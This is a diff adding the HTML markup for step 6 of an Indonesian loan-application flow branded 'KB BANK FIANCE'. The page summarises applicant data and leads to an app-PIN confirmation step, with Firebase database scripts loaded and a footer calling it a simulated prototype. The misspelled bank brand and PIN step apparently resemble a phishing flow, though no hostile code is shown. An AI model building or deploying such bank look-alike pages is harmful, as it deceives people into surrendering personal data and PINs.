@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>KB BANK FIANCE — Ringkasan Pengajuan</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="flow.css">
+</head>
+<body class="flow-page">
+  <main class="flow-shell">
+    <section class="flow-hero">
+      <div class="flow-top">
+        <button class="flow-back" id="backButton" type="button">←</button>
+        <button class="flow-lang" type="button">ID 🇮🇩</button>
+      </div>
+      <div class="flow-copy">
+        <div class="flow-step">Tahap 6</div>
+        <h1>Ringkasan Pengajuan</h1>
+        <p>Pastikan data pengajuan sudah sesuai sebelum dikirim.</p>
+      </div>
+    </section>
+    
+<section class="flow-card">
+  <div class="flow-title">
+    <h2>Ringkasan Pengajuan</h2>
+    <p>Periksa kembali seluruh informasi sebelum melanjutkan ke konfirmasi PIN aplikasi.</p>
+  </div>
+  <div class="summary-list">
+    <div class="summary-row"><span>Nama Pemohon</span><strong id="name">—</strong></div>
+    <div class="summary-row"><span>Nominal</span><strong id="amount">—</strong></div>
+    <div class="summary-row"><span>Tenor</span><strong id="tenor">—</strong></div>
+    <div class="summary-row"><span>Tujuan</span><strong id="purpose">—</strong></div>
+    <div class="summary-row"><span>Bunga Tahunan</span><strong id="rate">—</strong></div>
+  </div>
+  <div class="summary-total"><span>Estimasi angsuran per bulan</span><strong id="monthly">—</strong></div>
+  <div class="flow-actions">
+    <button class="flow-button secondary" id="editButton" type="button">UBAH DATA</button>
+    <button class="flow-button" id="confirmButton" type="button">LANJUT KONFIRMASI PIN →</button>
+  </div>
+</section>
+  </main>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="ringkasan-pengajuan.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
